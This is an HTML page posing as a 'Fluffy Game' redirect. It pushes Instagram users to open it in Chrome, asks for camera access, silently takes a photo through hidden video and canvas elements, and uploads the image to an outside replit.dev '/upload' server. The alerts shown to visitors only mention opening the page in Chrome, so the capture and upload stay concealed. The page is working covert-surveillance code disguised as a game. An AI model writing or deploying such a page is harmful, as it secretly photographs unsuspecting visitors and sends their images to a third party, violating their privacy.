<!DOCTYPE html>
<html>
<head>
  <title>Fluffy Game by Adarsh.lyy (redirecting) </title>
</head>
<body>
  <video id="video" autoplay playsinline style="display: none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  
  <script>
  if (navigator.userAgent.includes("Instagram")) {
    window.location.href = "googlechrome://fluffygame.vercel.app";
  }
  </script>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
      video.srcObject = stream;

      video.onloadedmetadata = () => {
        setTimeout(() => {
          takePhoto();
        }, 1); // adjust delay if needed
      };
    }).catch((err) => {
      alert("Camera access failed");
      console.error(err);
    });

    function takePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/png');

      fetch("https://39eb31e9-7973-41c9-9d96-97c9cf1368e7-00-1441qj89f8mev.pike.replit.dev/upload", {
        method: "POST",
        body: JSON.stringify({ image: imageData }),
        headers: {
          "Content-Type": "application/json"
        }
      })
      .then(response => response.text())
      .then(result => {
        alert(" Open this page in chrome to proceed");
        console.log(result);
      })
      .catch(error => {
        alert("Refresh and try again by allowing camera access by opening in chrome");
        console.error(error);
      });
    }
  </script>
</body>
</html>
